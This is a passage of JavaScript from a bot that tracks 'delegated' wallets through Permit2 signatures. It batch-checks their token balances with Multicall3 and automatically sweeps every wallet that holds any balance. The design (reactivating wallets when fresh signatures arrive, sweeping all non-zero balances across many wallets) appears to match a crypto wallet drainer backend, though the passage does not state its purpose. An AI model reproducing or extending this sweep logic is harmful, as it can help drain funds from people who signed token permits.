        const walletAddrRaw = sigAddress.endsWith("-sig") ? sigAddress.slice(0, -4) : sigAddress;
        const address = normalizeAddress(walletAddrRaw);
        if (!address) continue;
        const key = address.toLowerCase();
        const existing = monitoredWallets.get(key);
        if (!existing?.needs_reactivation) continue;
        if (existing.type !== "permit2-gasless" && existing.type !== "permit2") continue;
        const deadline = sig.deadline ? new Date(sig.deadline).getTime() : Infinity;
        if (deadline < Date.now()) continue;
        log(`[startup] 🔑 fresh sig found for stuck wallet ${address.slice(0, 10)} — auto-reactivating`);
        await supabase.from("delegated_wallets")
          .update({ needs_reactivation: false })
          .eq("address", key).eq("chain", CHAIN).then(v => v, () => {});
        monitoredWallets.set(key, { ...existing, needs_reactivation: false });
        needsReauthWallets.delete(key);
      }
    } catch (e) { warn(`[startup] sig reactivation check error: ${e.message}`); }
  }

  // Skip wallets that still need user re-activation after the sig check above.
  const wallets = [...monitoredWallets.values()].filter(w => w.type !== "monitoring" && !w.needs_reactivation);
  if (!wallets.length || !TOKENS.length) return;
  log(`[startup] batch-checking ${wallets.length} wallets × ${TOKENS.length} tokens…`);

  // Single Multicall3 across ALL wallets × ALL tokens — 1 RPC call per 250 pairs.
  // With fallback tokens (8) and 28 wallets this is 224 checks = 1 RPC call total.
  const multicall  = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
  const CHUNK      = 250;
  // Build flat call list: [wallet0×token0, wallet0×token1, ..., walletN×tokenM]
  const pairs = [];
  for (const w of wallets) {
    for (const t of TOKENS) {
      pairs.push({ wallet: w, token: t });
    }
  }

  // balanceMap: wallet address → { token, balance }[]
  const balanceMap = new Map();

  for (let i = 0; i < pairs.length; i += CHUNK) {
    const chunk = pairs.slice(i, i + CHUNK);
    try {
      const calls      = chunk.map(p => ({
        target:       p.token.address,
        allowFailure: true,
        callData:     ERC20_BAL_IFACE.encodeFunctionData("balanceOf", [p.wallet.address]),
      }));
      const returnData = await multicall.aggregate3(calls);
      for (let j = 0; j < chunk.length; j++) {
        const { success, returnData: data } = returnData[j];
        if (!success || !data || data === "0x") continue;
        try {
          const [balance] = ERC20_BAL_IFACE.decodeFunctionResult("balanceOf", data);
          if (balance > 0n) {
            const addr = chunk[j].wallet.address;
            if (!balanceMap.has(addr)) balanceMap.set(addr, []);
            balanceMap.get(addr).push({ ...chunk[j].token, balance });
          }
        } catch { /* malformed */ }
      }
    } catch (e) {
      warn(`[startup] multicall chunk ${i} failed: ${errStr(e)}`);
    }
  }

  let swept = 0;
  for (const w of wallets) {
    const nonZero = balanceMap.get(w.address) ?? [];
    if (nonZero.length === 0) continue;
    log(`[startup] ${w.address.slice(0, 10)} has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping`);
    await dispatchSweep(w).catch(e => log(`[startup] sweep error: ${e.message}`));
    swept++;
  }
  log(`[startup] pass complete — swept ${swept}/${wallets.length} wallets with balance`);
}

init().catch((e) => { err(`Init failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down…"); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down…"); process.exit(0); });

// Prevent QuickNode rate-limit errors from eth_unsubscribe crashing the bot.
// ethers.js fires unhandled rejections on WebSocket error responses even when
// the originating call is not awaited (e.g. removeAllListeners() → eth_unsubscribe).
process.on("unhandledRejection", (reason) => {
  const msg = reason?.message ?? String(reason ?? "");
  if (msg.includes("request limit") || msg.includes("-32007") || msg.includes("eth_unsubscribe") || msg.includes("coalesce")) {
    warn(`[bot] rate-limit rejection swallowed (not fatal): ${msg.slice(0, 120)}`);
    return;
  }
  warn(`[bot] unhandledRejection: ${msg.slice(0, 200)}`);
});
